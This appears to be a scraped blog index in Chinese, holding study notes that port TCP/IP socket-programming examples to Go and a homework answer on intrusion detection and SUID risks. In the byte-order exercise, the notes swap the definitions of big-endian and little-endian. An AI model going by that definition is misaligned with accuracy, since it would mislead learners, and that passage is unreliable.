26 27 28 29 30 31 32 33 34 35 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; ) // inet_aton converts an IPv4 address in dot-decimal notation into a 32-bit integer in network byte order. // If the IP address is valid, it stores the result in the given *uint32 and returns true. // If the IP address is invalid, it returns false. func inet_aton(ipStr string, ip *uint32) bool { parsedIP := net.ParseIP(ipStr) if parsedIP == nil { return false } parsedIP = parsedIP.To4() if parsedIP == nil { return false } *ip = binary.BigEndian.Uint32(parsedIP) return true } func main() { addr := \u0026#34;127.232.124.79\u0026#34; var ip uint32 if !inet_aton(addr, \u0026amp;ip) { log.Fatalln(\u0026#34;Conversion error\u0026#34;) } else { fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, ip) } } inet_aton 上述运行结果无关紧要,更重要的是大家要熟练掌握该函数的调用方法。最后再介绍一个与inet_aton函数正好相反的函数,此函数可以把网络字节序整数型IP地址转换成我们熟悉的字符串形式。\n1 2 3 #include \u0026lt;arpa/inet.h\u0026gt; char * inet_ntoa(struct in_addr adr); //成功时返回转换的字符串地址值,失败时返回-1。 该函数将通过参数传入的整数型IP地址转换为字符串格式并返回。 但调用时需小心,返回值类型为char指针。返回字符串地址意味着字符串已保存到内存空间,但该函数未向程序员要求分配内存,而是在内部申请了内存并保存了字符串。也就是说,调用完该函数后,应立即将字符串信息复制到其他内存空间。总之,再次调用inet_ntoa函数前返回的字符串地址值是有效的。若需要长期保存,则应将字符串复制到其他内存空间。\nGo语言标准库中并没有直接提供对C语言中的网络地址转换函数的封装。如果要在Go中实现类似的功能，可以使用net包中的IP和IPv4类来进行IP地址的转换和操作。以下是一个简单的示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main1() { var addr1, addr2 uint32 = 0x1020304, 0x1010101 ip1 := net.IPv4(byte(addr1\u0026gt;\u0026gt;24), byte(addr1\u0026gt;\u0026gt;16), byte(addr1\u0026gt;\u0026gt;8), byte(addr1)) ip2 := net.IPv4(byte(addr2\u0026gt;\u0026gt;24), byte(addr2\u0026gt;\u0026gt;16), byte(addr2\u0026gt;\u0026gt;8), byte(addr2)) fmt.Printf(\u0026#34;Dotted-Decimal notation1: %s \\n\u0026#34;, ip1.String()) fmt.Printf(\u0026#34;Dotted-Decimal notation2: %s \\n\u0026#34;, ip2.String()) } 用go自行写的 inet_aton函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) // inet_ntoa converts a 32-bit integer in network byte order into a dotted-decimal IP address. func inet_ntoa(ipInt uint32) string { ipBytes := make([]byte, 4) ipBytes[0] = byte(ipInt \u0026gt;\u0026gt; 24) ipBytes[1] = byte(ipInt \u0026gt;\u0026gt; 16) ipBytes[2] = byte(ipInt \u0026gt;\u0026gt; 8) ipBytes[3] = byte(ipInt) return net.IP(ipBytes).String() } func main() { var addr1, addr2 uint32 = 0x1020304, 0x1010101 fmt.Printf(\u0026#34;Dotted-Decimal notation1: %s \\n\u0026#34;, inet_ntoa(addr1)) fmt.Printf(\u0026#34;Dotted-Decimal notation2: %s \\n\u0026#34;, inet_ntoa(addr2)) } 网络地址初始化 上述代码中,memset函数将每个字节初始化为同一值:第一个参数为结构体变量addr的地址值,即初始化对象为addr;第二个参数为0,因此初始化为0;最后一个参数中传入addr的长度,因此addr的所有字节均初始化为0。这么做是为了将sockaddr_in结构体的成员sin_zero初始化为0。 另外,最后一行代码调用的atoi函数把字符串类型的值转换成整数型。总之,上述代码利用字符串格式的IP地址和端口号初始化了sockaddr_in结构体变量。 另外,代码中对IP地址和端口号进行了硬编码,这并非良策,因为运行环境改变就得更改代码。因此,我们运行示例main函数时传入IP地址和端口号。\n客户端地址信息初始化 上述网络地址信息初始化过程主要针对服务器端而非客户端。给套接字分配IP地址和端口号主要是为下面这件事做准备:\n“请把进入IP 211.217.168.13、9190端口的数据传给我!” 反观客户端中连接请求如下:\n“请连接到IP 211.217.168.13、9190端口!” 请求方法不同意味着调用的函数也不同。服务器端的准备工作通过bind函数完成,而客户端则通过connect函数完成。因此,函数调用前需准备的地址值类型也不同。服务器端声明sockaddr_in 结构体变量,将其初始化为赋子服务器端IP和套接字的端口号,然后调用bind函数;而客户端则声明sockaddr_in结构体,并初始化为要与之连接的服务器端套接字的IP和端口号,然后调用connect函数。\nINADDR_ANY 与之前方式最大的区别在于,利用常数INADDR_ANY分配服务器端的IP地址。若采用这种方式,则可自动获取运行服务器端的计算机IP地址,不必亲自输人。而且,若同一计算机中已分配多个IP地址(多宿主(Multi-homed)计算机,一般路由器属于这一类),则只要端口号一致, 就可以从不同IP地址接收数据。因此,服务器端中优先考虑这种方式。而客户端中除非带有一部分服务器端功能,否则不会采用。\n初始化服务器端套接字时应分配所属计算机的IP地址,因为初始化时使用的IP地址非常明确,那为何还要进行IP初始化呢?如前所述,同一计算机中可以分配多个IP地址, 实际IP地址的个数与计算机中安装的NIC的数量相等。即使是服务器端套接字,也需要决定应接收哪个IP传来的(哪个NIC传来的)数据。因此,服务器端套接字初始化过程中要求IP地址信息。另外,若只有1个NIC,则直接使用INADDR_ANY。\n在 Go 中，你可以使用空字符串 \u0026quot;\u0026quot; 作为 IP 地址来代表 INADDR_ANY，这表示监听所有的 IP 地址。以下是一个简单的 TCP 服务器示例，它监听所有的 IP 地址和一个特定的端口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; ) func main() { listener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:8080\u0026#34;) if err != nil { log.Fatal(err) } defer listener.Close() for { conn, err := listener.Accept() if err != nil { log.Fatal(err) } go handleConnection(conn) } } func handleConnection(conn net.Conn) { // Handle the connection defer conn.Close() } 在这个示例中，net.Listen(\u0026quot;tcp\u0026quot;, \u0026quot;:8080\u0026quot;) 会监听所有的 IP 地址和端口 8080。当有新的连接到来时，listener.Accept() 会返回一个新的 net.Conn 对象，然后你可以在新的 goroutine 中处理这个连接。\n向套接字分配网络地址 既然已讨论了sockaddr_in结构体的初始化方法,接下来就把初始化的地址信息分配给套接字。bind函数负责这项操作。\n1 2 3 4 5 6 #include \u0026lt;sys/socket.h\u0026gt; int bind(int sockfd, struct sockaddr * myaddr, socklen_t addrLen); //成功时返回0,失败时返回-1。 //sockfd 要分配地址信息(IP地址和端口号)的套接字文件描述符。 //myaddr 存有地址信息的结构体变量地址值。 //addrlen 第二个结构体变量的长度。 在 Go 语言中，Bind 函数是 syscall 包中的一个函数，用于将本地协议地址 addr 绑定到文件描述符 fd。函数原型如下：\n1 2 3 4 5 6 7 func Bind(fd int, sa Sockaddr) (err error) { ptr, n, err := sa.sockaddr() if err != nil { return err } return bind(fd, ptr, n) } 其中，fd 是通过 Socket 函数获取的文件描述符，addr 是一个实现了 Sockaddr 接口的网络地址。\n两者的主要区别在于：\nGo 的 Bind 函数使用了接口 Sockaddr，这使得你可以传入任何实现了 Sockaddr 接口的类型，如 SockaddrInet4、SockaddrInet6、SockaddrUnix 等。而 C 的 bind 函数需要一个指向 struct sockaddr 的指针，需要手动进行类型转换。\nGo 的 Bind 函数返回一个错误值，你可以直接检查这个错误值来确定 Bind 函数是否成功。而 C 的 bind 函数返回一个整数，需要检查这个整数和 errno 来确定 bind 函数是否成功。\nGo 的 Bind 函数处理了一些底层的细节，如网络字节序的转换。而在 C 中，需要手动进行这些操作。\n1 2 3 4 5 6 7 func bind(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) { _, _, e1 := syscall(abi.FuncPCABI0(libc_bind_trampoline), uintptr(s), uintptr(addr), uintptr(addrlen)) if e1 != 0 { err = errnoErr(e1) } return } 在 Go 语言的 syscall 包中，Bind 和 bind 函数都是用来将本地协议地址绑定到文件描述符的。 bind 函数是一个私有的函数，它直接接受一个文件描述符和一个 unsafe.Pointer 类型的地址作为参数，然后调用系统调用 bind。这个函数通常不会直接被用户代码调用，而是被 Bind 函数调用。 bind 函数是通过 syscall 函数调用 libc_bind_trampoline 函数来实现的，这个函数是一个跳板函数，它会跳转到动态链接库中的 bind 函数。 总的来说，Bind 函数提供了一个更高级的接口，它处理了类型转换和错误处理，而 bind 函数是一个更底层的接口，它直接调用系统调用。\n3.5 基于Windows的实现 略\n3.6 习题 IP地址族IPv4和IPv6有何区别?在何种背景下诞生了IPv6?\nIPv4与IPv6的差别主要是表示IP地址所用的字节数,目前通用的地址族为IPv4。IPv6是为了应对2010年前后IP地址耗尽的问题而提出的标准。\n通过IPv4网络ID、主机ID及路由器的关系说明向公司局域网中的计算机传输数据的过程。\n网络地址(网络ID)是为区分网络而设置的一部分IP地址。假设向WWW.SEMI.COM公司传输数据,该公司内部构建了局域网,把所有计算机连接起来。因此,首先应向SEMI.COM网络传输数据,也就是说,并非一开始就浏览所有4字节IP地址,进而找到目标主机;而是仅浏览4字节IP地址的网络地址,先把数据传到SEMI.COM的网络。SEMI.COM网络(构成网络的路由器)接收到数据后,浏览传输数据的主机地址(主机ID)并将数据传给目标计算机。\n套接字地址分为IP地址和端口号。为什么需要地址和端口号?或者说,通过IP可以区分哪些对象?通过端口号可以区分哪些对象?\n套接字地址分为IP地址和端口号，是为了在网络中唯一标识一个通信端点。IP地址用于区分不同的主机，即不同的计算机。端口号用于区分同一主机上的不同进程，即不同的应用程序。\n请说明IP地址的分类方法,并据此说出下面这些IP地址的分类。 214.121.212.102 （C类） 120.101.122.89 （A类） 129.78.102.211 （B类） 计算机通过路由器或交换机连接到互联网。请说出路由器和交换机的作用。\n若想构建网络,需要一种物理设备完成外网与本网主机之间的数据交换,这种设备便是路由器或交换机。\n什么是知名端口?其范围是多少?知名端口中具有代表性的HTTP和FTP端口号各是多少?\n0-1023是知名端口(Well-known PORT),一般分配给特定应用程序。HTTP的端口号是80，FTP的端口号是21\n向套接字分配地址的bind函数原型如下: int bind(int sockfd, struct sockaddr *myaddr,socklen_t addrlen); 而调用时则用bind(serv_sock,(struct sockaddr *)\u0026amp;sery_addr, sizeof (serv_addr)); 此处serv_addr为sockaddr_in结构体变量。与函数原型不同,传入的是sockaddr_in结构体变量,请说明原因。\nsockaddr_in 结构体是 sockaddr 结构体的一种特定类型，因此可以通过类型转换将其传递给 bind 函数。这是因为 sockaddr_in 结构体包含了 sockaddr 结构体的所有成员，所以在实际调用中可以将 sockaddr_in 结构体的指针转换为 sockaddr 结构体的指针，从而符合 bind 函数的参数要求。\n请解释大端序、小端序、网络字节序,并说明为何需要网络字节序。\n大端序（Big-Endian）：数据的低位字节存储在内存的低地址，高位字节存储在内存的高地址。 小端序（Little-Endian）：数据的高位字节存储在内存的低地址，低位字节存储在内存的高地址。 网络字节序（Network Byte Order）：是指在网络传输中采用的字节序。网络字节序采用大端序，这是因为大端序与人类阅读数字的顺序一致，因此更容易理解和识别。 网络字节序是网络传输的标准，因此在网络传输中采用网络字节序可以确保数据在不同计算机之间正确传输。 大端序计算机希望把4字节整数型数据12传递到小端序计算机。请说出数据传输过程中发生的字节序变换过程。\n数据 12 在网络传输过程中的字节序没有发生变化，仍然是大端序。小端序计算机在接收到数据后，需要将数据中的高位字节和低位字节进行交换，以将数据转换为小端序。\n大端序 网络字节序 小端序 0x0000000C 0x0000000C 0x0C000000 怎样表示回送地址?其含义是什么?如果向回送地址传输数据将发生什么情况? 回送地址（loopback address）是指本地主机的 IP 地址。在 IPv4 中，回送地址为 127.0.0.1。 回送地址用于本地主机之间的通信。如果向回送地址传输数据，则数据将会被本地主机接收并处理。 ","date":"2023-11-15T20:09:07+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%89%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCP、IP网络编程第三章笔记"},{"content":"得分：10/10\n第六讲 IDS有哪些主要功能?\n网络流量的跟踪与分析功能：跟踪用户进出网络的所有活动，实时检测并分析用户在系统中的活动状态；实时统计网络流量，检测拒绝服务攻击等异常行为。\n已知攻击特征的识别功能：识别特定类型的攻击，并向控制台报警，为网络防护提供依据。根据定制的条件过滤重复告警事件，减轻传输与响应的压力。\n异常行为的分析、统计与响应功能：分析系统的异常行为模式，统计异常行为，并对异常行为做出响应。\n特征库的在线和离线升级功能：提供入侵检测规则的在线和离线升级，实时更新入侵特征库，不断提高IDS的入侵检测能力。\n数据文件的完整性检查功能：检查关键数据文件的完整性，识别并报告数据文件的改动情况。\n自定义的响应功能：定制实时响应策略；根据用户定义，经过系统过滤，对告警事件及时响应。\n系统漏洞的预报警功能：对新发现或新公布的系统漏洞特征进行预报警。\nIDS探测器集中管理功能：通过控制台收集探测器的状态和告警信息，控制各个探测器的行为。\n简述误用检测和异常检测。\n误用检测技术又称基于知识或特征的检测技术。它假定所有入侵行为和手段(及其变种)都能够表达为一种模式或特征，并对已知的入侵行为和手段进行分析，提取入侵特征，构建攻击模式或攻击签名，通过系统当前状态与攻击模式或攻击签名的匹配判断入侵行为。误用检测是最成熟、应用最广泛的技术。 异常检测技术又称为基于行为的入侵检测技术，用来检测系统（主机或网络）中的异常行为。 总结NIDS的脆弱性。\n检测的工作量很大：NIDS需要高效的检测方法和大量的系统资源。容易遭受DoS攻击。 检测方法局限性：特征匹配方法有其固有缺陷，难以完全检测入侵行为。 网络协议复杂性：NIDS难以精确分析复杂的网络协议。 系统实现差异：NIDS难以完全兼容不同系统的实现方式。 简述网络安全态势感知系统。\n网络安全态势感知系统可以看成是基于分布式入侵检测系统的综合安全监控系统，具有入侵检测、安全状态可视化展示、安全状态理解及趋势分析预测，以及网络监视和网络控制等功能。\n第七讲 简述TCSEC(受信计算机系统评测标准)标准的C2安全级4项关键功能。\n安全登录机制 要求系统提供强大的用户身份验证机制，防止未经授权的用户登录系统。\n自主访问控制机制 要求系统提供自主访问控制机制，允许系统管理员根据需要对系统资源进行访问控制。\n安全审计机制 系统必须提供安全审计机制，以记录系统的关键操作，以便在发生安全事件时进行调查。\n对象重用保护机制 对象重用保护机制就是残留信息的处理机制，即：阻止一个用户利用或阅读另一个用户已删除的数据，或访问另一个用户曾经使用并释放的内存。\n在哪些情况下可能会发生输入验证攻击。\n程序无法辨认语法上不正确的输入。 模块接受了无关的输入。 模块没有能够处理遗漏的输入域。 发生了域值相关性错误。 为什么root对其可执行文件设置用户ID许可会带来严重的安全隐患?\n因为当某可执行文件是root创建的，如果设置了SUID，而该可执行文件又被赋予了其他普通用户的可执行权限，则该程序被任何用户运行时，对应的进程的euid是root，该进程可以访问任何文件。\n","date":"2023-11-15T18:44:57+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A4/","title":"网络安全作业4"},{"content":"2.1 套接字协议及其数据传输特性 协议 如果相隔很远的两人想展开对话,必须先决定对话方式。如果一方使用电话,那么另一方也只能使用电话,而不是书信。可以说,电话就是两人对话的协议。协议是对话中使用的通信规则, 把上述概念拓展到计算机领域可整理为“计算机间对话必备通信规则”。\n创建套接字 1 2 3 4 5 6 #include \u0026lt;sys/socket.h\u0026gt; int socket (int domain, int type, int protocol); //成功时返回文件描述符,失败时返回-1。 //domain 套接字中使用的协议族(Protocol Family)信息。 //type 套接字数据传输类型信息。 //protocol 计算机间通信中使用的协议信息。 在 Go 语言的 syscall 包中，Socket 函数是对底层 socket 系统调用的封装。这样做的目的是为了提供一个更加 Go 风格（例如错误处理）的接口，同时隐藏一些底层细节。\nSocket 函数内部调用了 socket 函数。socket 函数直接执行了系统调用，并返回了原始的结果，包括一个文件描述符和一个错误号。然后 Socket 函数将这些原始结果转换为 Go 风格的结果：如果系统调用成功，它返回一个文件描述符和一个 nil 错误；如果系统调用失败，它返回一个 -1 文件描述符和一个非 nil 错误。\n这样做的好处是，对于大多数 Go 程序员来说，他们只需要关心 Socket 函数，而不需要了解底层的 socket 系统调用和错误处理。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // Socket 函数创建一个新的套接字，并返回其文件描述符和可能的错误。 // domain 参数指定了套接字的协议族（例如，AF_INET 代表 IPv4，AF_INET6 代表 IPv6）。 // typ 参数指定了套接字的类型（例如，SOCK_STREAM 代表 TCP，SOCK_DGRAM 代表 UDP）。 // proto 参数指定了套接字使用的协议（例如，IPPROTO_TCP 代表 TCP，IPPROTO_UDP 代表 UDP）。 func Socket(domain, typ, proto int) (fd int, err error) { // 如果 domain 是 AF_INET6（即，我们正在尝试创建一个 IPv6 套接字）， // 但是 SocketDisableIPv6 为 true（即，我们禁用了 IPv6），则返回错误 EAFNOSUPPORT。 if domain == AF_INET6 \u0026amp;\u0026amp; SocketDisableIPv6 { return -1, EAFNOSUPPORT } // 调用底层的 socket 函数创建套接字。 fd, err = socket(domain, typ, proto) return } // socket 函数创建一个新的套接字，并返回其文件描述符和可能的错误。 // domain 参数指定了套接字的协议族（例如，AF_INET 代表 IPv4，AF_INET6 代表 IPv6）。 // typ 参数指定了套接字的类型（例如，SOCK_STREAM 代表 TCP，SOCK_DGRAM 代表 UDP）。 // proto 参数指定了套接字使用的协议（例如，IPPROTO_TCP 代表 TCP，IPPROTO_UDP 代表 UDP）。 // rawSyscall 函数执行一个底层的系统调用，其参数是系统调用的编号和参数。 // 如果系统调用失败，它返回一个非零的错误号 e1，我们将其转换为 Go 的 error 类型并返回。 func socket(domain int, typ int, proto int) (fd int, err error) { r0, _, e1 := rawSyscall(abi.FuncPCABI0(libc_socket_trampoline), uintptr(domain), uintptr(typ), uintptr(proto)) fd = int(r0) if e1 != 0 { err = errnoErr(e1) } return } 协议族(Protocol Family) 通过socket函数的第一个参数传递套接字中使用的协议分类信息。此协议分类信息称为协议族。 原文给的c语言头文件中的分类 在 Go 语言的 syscall 包中，domain 参数用于指定套接字的协议族。以下是一些常见的 domain 值：\n值 描述 AF_INET IPv4 网络协议 AF_INET6 IPv6 网络协议 AF_UNIX UNIX 域套接字 AF_NETLINK 内核用户接口设备 AF_PACKET 低级包接口 AF_CAN Controller Area Network AF_BLUETOOTH 蓝牙设备 请注意，不是所有的 domain 值都在所有的平台上可用。具体可用的 domain 值取决于你的操作系统和平台。\n套接字类型(Type) 套接字类型指的是套接字的数据传输方式,通过socket函数的第二个参数传递,只有这样才能决定创建的套接字的数据传输方式。这种说法可能会使各位感到疑惑。已通过第一个参数传递了协议族信息,还要决定数据传输方式?问题就在于,决定了协议族并不能同时决定数据传输方式,换言之,socket数第一个参数PF_INET协议族中也存在多种数据传输方式。\n面向连接的套接字(SOCK_STREAM) 如果向socket函数的第二个参数传递SOCK_STREAM,将创建面向连接的套接字。面向连接的套接字到底具有哪些特点呢?\n套接字连接必须一一对应 传输过程中数据不会消失 按序传输数据 传输的数据不存在数据边界 收发数据的套接字内部有缓冲(buffer),简言之就是字节数组。通过套接字传输的数据将保存到该数组。因此,收到数据并不意味着马上调用read函数。只要不超过数组容量,则有可能在数据填充满缓冲后通过1次read函数调用读取全部,也有可能分成多次read函数调用进行读取。也就是说,在面向连接的套接字中,read函数和write函数的调用次数并无太大意义。所以说面向连接的套接字不存在数据边界。\n套接字缓冲已满是否意味着数据丢失 之前讲过,为了接收数据,套接字内部有一个由字节数组构成的缓冲。如果这个缓冲被接收的数据填满会发生什么事情?之后传递的数据是否会丢失? 首先调用read函数从缓冲读取部分数据,因此,缓冲并不总是满的。但如果read函数读取速度比接收数据的速度慢,则缓冲有可能被填满。此时套接字无法再接收数据, 但即使这样也不会发生数据丢失,因为传输端套接字将停止传输。也就是说,面向连接的套接字会根据接收端的状态传输数据,如果传输出错还会提供重传服务。因此,面向连接的套接字除特殊情况外不会发生数据丢失。\n面向消息的套接字(SOCK_DGRAM) 如果向socket函数的第二个参数传递SOCK_DGRAM,则将创建面向消息的套接字。面向消息的套接字可以比喻成高速移动的摩托车快递。\n强调快速传输而非传输顺序 传输的数据可能丢失也可能损毁 传输的数据有数据边界 限制每次传输的数据大小 众所周知,快递行业的速度就是生命。用摩托车发往同一目的地的2件包裹无需保证顺序, 只要以最快速度交给客户即可。这种方式存在损坏或丢失的风险,而且包裹大小有一定限制。因此,若要传递大量包裹,则需分批发送。另外,如果用2辆摩托车分别发送2件包裹,则接收者也需要分2次接收。这种特性就是“传输的数据具有数据边界”。\n面向消息的套接字比面向连接的套接字具有更快的传输速度,但无法避免数据丢失或损毁。另外,每次传输的数据大小具有一定限制,并存在数据边界。存在数据边界意味着接收数据的次数应和传输次数相同。面向消息的套接字特性总结如下: “不可靠的、不按序传递的、以数据的高速传输沟目的的套接字\u0026quot;\n最终选择的协议 下面讲解socket函数的第三个参数,该参数决定最终采用的协议。 前面已经通过socket函数的前两个参数传递了协议族信息和套接字数据传输方式,这些信息还不足以决定采用的协议吗?为什么还需要传递第3个参数呢? 传递前两个参数即可创建所需套接字。所以大部分情况下可以向第三个参数传递0,除非遇到以下这种情况: “同一协议族中存在多个数据传输方式相同的协议”数据传输方式相同,但协议不同。此时需要通过第三个参数具体指定协议信息。\nTCP套接字示例 tcp_server.go (系统函数调用版)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { if len(os.Args) != 2 { fmt.Printf(\u0026#34;Usage: %s \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } port, _ := strconv.Atoi(os.Args[1]) //1.创建一个 TCP 套接字。 fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) if err != nil { fmt.Printf(\u0026#34;socket() error: %v\u0026#34;, err) } //2.将套接字绑定到指定的 IP 地址和端口号。 // 创建一个 SockaddrInet4 结构体实例，并设置端口号 servAddr := \u0026amp;syscall.SockaddrInet4{Port: port} // 将 IP 地址设置为 0.0.0.0，这样服务器可以接受来自任何客户端的连接 copy(servAddr.Addr[:], []byte{0, 0, 0, 0}) err = syscall.Bind(fd, servAddr) if err != nil { log.Fatalf(\u0026#34;bind() error: %v\u0026#34;, err) } //3.将套接字转为可接收连接状态 err = syscall.Listen(fd, 10) if err != nil { log.Fatalf(\u0026#34;listen() error: %v\u0026#34;, err) } //4.Accept()接收连接 connFd, _, err := syscall.Accept(fd) if err != nil { log.Fatalf(\u0026#34;accept() error: %v\u0026#34;, err) } //5.write()发送信息 message := \u0026#34;Hello world!\u0026#34; _, err = syscall.Write(connFd, []byte(message)) if err != nil { log.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) } syscall.Close(connFd) syscall.Close(fd) } tcp_clinet.go 更改read函数调用方式，在客户端中分多次调用read函数以接收服务器端发送的全部数据,以验证tcp传输的数据不存在数据边界。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { if len(os.Args) != 3 { log.Fatalf(\u0026#34;Usage: %s \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } ip := os.Args[1] portStr := os.Args[2] port, err := strconv.Atoi(portStr) if err != nil { log.Fatalf(\u0026#34;Invalid port number: %s\\n\u0026#34;, portStr) } fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) // 设置服务器的地址和端口 servAddr := \u0026amp;syscall.SockaddrInet4{Port: port} copy(servAddr.Addr[:], net.ParseIP(ip).To4()) // 使用 syscall.Connect 函数将套接字连接到服务器 err = syscall.Connect(fd, servAddr) if err != nil { log.Fatalf(\u0026#34;connect() error: %v\u0026#34;, err) } // 使用 syscall.Read 接收信息 buf := make([]byte, 1024) message := make([]byte, 0) for { n, err := syscall.Read(fd, buf) if err != nil { if err != io.EOF { log.Fatalf(\u0026#34;Read error: %v\u0026#34;, err) } break } if n == 0 { break } message = append(message, buf[:n]...) } fmt.Printf(\u0026#34;Message from server: %s\\n\u0026#34;, message) fmt.Printf(\u0026#34;Function read() read %d bytes\\n\u0026#34;, len(message)) syscall.Close(fd) } 运行\n1 2 3 4 5 6 7 8 go build -o ch2/tcpServer/tcp_server ch2/tcpServer/tcp_server.go go build -o ch2/tcpClient/tcp_client ch2/tcpClient/tcp_client.go ./ch2/tcpServer/tcp_server 8888 ./ch2/tcpClient/tcp_client 127.0.0.1 8888 Message from server: Hello world! Function read() read 12 bytes 2.2 Windows平台啊下的实现及验证 略\n2.3 习题 什么是协议?在收发数据中定义协议有何意义?\n面向连接的TCP套接字传输特性有3点,请分别说明。\n无数据边界 传输过程中数据不会消失 按序传输 下列哪些是面向消息的套接字的特性? a. 传输数据可能丢失 b. 没有数据边界(Boundary) （面向连接） c. 以快速传递为目标 d. 不限制每次传递数据的大小 （限制大小） e. 与面向连接的套接字不同,不存在连接的概念\n下列数据适合用哪类套接字传输?并给出原因。\na. 演唱会现场直播的多媒体数据(面向消息) 因为面向消息的套接字以快速传递为目标，适合传输多媒体数据，即使传输数据可能丢失也不会影响整体效果。 b. 某人压缩过的文本文件(面向连接) 因为面向连接的套接字可以保证数据的可靠传输，适合传输对数据完整性要求较高的文本文件。 c. 网上银行用户与银行之间的数据传递(面向连接) 面向连接的套接字提供可靠的、按顺序传送的数据传输服务，适合对数据完整性和安全性要求较高的网上银行交易。 何种类型的套接字不存在数据边界?这类套接字接收数据时需要注意什么? 面向连接的套接字不存在数据边界。面向连接的TCP套接字在接收数据时需要注意处理粘包和拆包的问题，确保按照应用层协议的要求正确解析和处理接收到的数据\ntcp_server.c和tcp_client.c中需多次调用read函数读取服务器端调用I次write函数传递的字符串。更改程序,使服务器端多次调用(次数自拟)write函数传输数据,客户端调用1 次read函数进行读取。为达到这一目的,客户端需延迟调用read函数,因为客户端要等待服务器端传输所有数据。Windows和Linux都通过下列代码延迟read或recv函数的调用。for(1=0;i\u0026lt;3000;i++) printf(\u0026ldquo;wait time %d \\n\u0026rdquo;, i); 让CPU执行多余任务以延迟代码运行的方式称为 “Busy Waiting”。使用得当即可推迟函数调用。\n","date":"2023-11-11T12:48:30+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCP、IP网络编程第二章笔记"},{"content":"1.1 理解网络和套接字 套接字 套接字（socket）是计算机网络中进程间通信的一种机制，它将进程间通信抽象为一个端点，该端点由一个IP地址和一个端口号来标识。 套接字是网络数据传输用的软件设备。网络编程又称为套接字编程。\n编写\u0026quot; Hello world! \u0026quot; 服 务 器 端 网络编程中接受连接请求的套接字创建过程可整理如下。\n第一步:调用s o c k e t 函数创建套接字。 第二步:调用b i n d 函数分配E地址和端口号。 第三步:调用l i s t e n 函数转为可接收请求状态。 第四步:调用a c c e p t 函数受理连接请求。 hello_server.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) func main() { //检查参数 if len(os.Args) != 2 { log.Fatalf(\u0026#34;Usage: %s \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } //设置监听端口和信息 message := \u0026#34;Hello world!\u0026#34; port := os.Args[1] //当你调用 net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:\u0026#34;+port) 时，Go 会执行以下操作： //1.创建一个 TCP 套接字。 //2.将套接字绑定到指定的 IP 地址和端口号。 //3.将套接字转为可接收连接状态 listener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:\u0026#34;+port) if err != nil { log.Fatalf(\u0026#34;socket() error: %v\u0026#34;, err) } //延迟关闭监听 defer listener.Close() //循环监听 for { //4.Accept()接收连接 conn, err := listener.Accept() if err != nil { log.Fatalf(\u0026#34;accept() error: %v\u0026#34;, err) } //5.write()发送信息 _, err = conn.Write([]byte(message)) if err != nil { log.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) } conn.Close() } } client 创建套接字,但此时套接字并不马上分为服务器端和客户端。如果紧接着调用bind和listen函数,将成为服务器端套接字;如果调用connect函数将成为客户端套接字。\nhello_client.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) func main() { if len(os.Args) != 3 { log.Fatalf(\u0026#34;Usage: %s \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } ip := os.Args[1] port := os.Args[2] address := fmt.Sprintf(\u0026#34;%s:%s\u0026#34;, ip, port) //1.创建一个 TCP 套接字。 //2.调用 Connect() 连接到指定的 IP 地址和端口号。 conn, err := 